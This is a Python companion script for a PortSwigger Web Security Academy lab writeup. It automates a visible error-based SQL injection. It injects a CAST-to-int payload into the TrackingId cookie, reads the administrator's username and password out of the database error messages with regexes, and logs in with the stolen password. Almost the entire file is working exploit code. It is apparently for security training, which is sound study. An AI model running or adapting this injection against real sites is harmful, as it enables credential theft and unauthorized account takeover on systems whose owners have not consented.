#!/usr/bin/env python3
"""
Visible error-based SQL injection
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 13-visible-error-based.md

What this does:
    Forces a CAST(... AS int) failure on the TrackingId cookie so the
    database's own verbose error message leaks the offending value. Injects
    with an EMPTY TrackingId prefix (the cookie has a ~63-char limit, and the
    original value would eat into that budget) and reads username and
    password back out of the error text with a regex.

Usage:
    python 13-visible-error-based.py <lab-url>

Requirements:
    pip install httpx
"""

import html
import re
import sys
import httpx


def extract_via_cast_error(client: httpx.Client, lab_url: str, session: str, cast_query: str) -> str:
    suffix = f"' AND 1=CAST({cast_query} AS int)-- "
    cookie = f"TrackingId={suffix}; session={session}"
    r = client.get(lab_url, headers={"Cookie": cookie})
    text = html.unescape(r.text)

    patterns = [
        r'invalid input syntax[^"]*?"([^"]+)"',
        r'Conversion failed[^"]*?"([^"]+)"',
        r'value "([a-zA-Z0-9@._\-]{4,})"',
        r'ERROR.*?"([a-zA-Z0-9@._\-]{4,})"',
    ]
    for pat in patterns:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            return m.group(1)
    return ""


def get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    seed = client.get(lab_url)
    session = seed.cookies.get("session", "")

    username = extract_via_cast_error(client, lab_url, session, "(SELECT username FROM users LIMIT 1)")
    print(f"[+] Extracted username: {username}")

    password = extract_via_cast_error(client, lab_url, session, "(SELECT password FROM users LIMIT 1)")
    if not password:
        print("[-] Could not extract a password from the error message.")
        return
    print(f"[+] Extracted password: {password}")

    csrf = get_csrf(client, f"{lab_url}/login")
    login = client.post(f"{lab_url}/login", data={"username": "administrator", "password": password, "csrf": csrf})
    if "Log out" in login.text or "/my-account" in str(login.url):
        print("[+] Logged in as administrator. Lab solved.")
    else:
        print("[-] Login did not succeed -- the unfiltered first row may not be administrator's.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
